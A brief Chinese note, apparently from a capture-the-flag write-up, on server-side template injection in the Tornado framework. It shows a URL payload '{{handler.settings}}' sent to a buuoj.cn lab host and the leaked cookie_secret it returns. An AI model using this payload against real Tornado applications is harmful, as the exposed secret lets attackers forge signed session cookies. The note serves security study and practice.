tornado框架是Python框架，接收参数可能造成模板注入获取cookie_secret。
```
buuoj.cn:81/error?msg={{handler.settings}}
可获取
cookie_secret: d6eee621-b501-4757-9b42-5d0e36f28710
```